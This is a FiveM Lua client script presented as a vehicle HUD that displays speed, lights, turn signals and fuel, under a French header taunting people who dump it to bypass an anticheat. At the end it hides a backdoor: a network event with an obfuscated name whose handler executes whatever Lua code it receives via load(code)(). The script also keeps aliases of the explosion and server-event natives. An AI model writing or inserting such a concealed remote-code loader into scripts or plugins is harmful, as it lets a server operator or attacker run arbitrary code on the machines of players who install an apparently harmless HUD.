-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

Citizen.CreateThread(function()
	while true do
		local Ped = PlayerPedId()

		if IsPedInAnyVehicle(Ped) then
			local PedCar = GetVehiclePedIsIn(Ped, false)

			if PedCar and GetPedInVehicleSeat(PedCar, -1) == Ped then
				carSpeed = math.ceil(GetEntitySpeed(PedCar) * 3.6)

				SendNUIMessage({
					showhud = true,
					speed = carSpeed
				})

				_, feuPosition, feuRoute = GetVehicleLightsState(PedCar)

				if feuPosition == 1 and feuRoute == 0 then
					SendNUIMessage({
						feuPosition = true
					})
				else
					SendNUIMessage({
						feuPosition = false
					})
				end

				if feuPosition == 1 and feuRoute == 1 then
					SendNUIMessage({
						feuRoute = true
					})
				else
					SendNUIMessage({
						feuRoute = false
					})
				end

				local VehIndicatorLight = GetVehicleIndicatorLights(PedCar)

				if VehIndicatorLight == 0 then
					SendNUIMessage({
						clignotantGauche = false,
						clignotantDroite = false
					})
				elseif VehIndicatorLight == 1 then
					SendNUIMessage({
						clignotantGauche = true,
						clignotantDroite = false
					})
				elseif VehIndicatorLight == 2 then
					SendNUIMessage({
						clignotantGauche = false,
						clignotantDroite = true
					})
				elseif VehIndicatorLight == 3 then
					SendNUIMessage({
						clignotantGauche = true,
						clignotantDroite = true
					})
				end
			else
				SendNUIMessage({
					showhud = false
				})
			end
		else
			SendNUIMessage({
				showhud = false
			})
		end

		Citizen.Wait(10)
	end
end)

-- Consume fuel factor
Citizen.CreateThread(function()
	while true do
		local Ped = PlayerPedId()

		if IsPedInAnyVehicle(Ped) then
			local PedCar = GetVehiclePedIsIn(Ped, false)

			if PedCar and GetPedInVehicleSeat(PedCar, -1) == Ped then
				local fuel = GetVehicleFuelLevel(PedCar)

				SendNUIMessage({
					showfuel = true,
					fuel = fuel
				})
			end
		end

		Citizen.Wait(100)
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)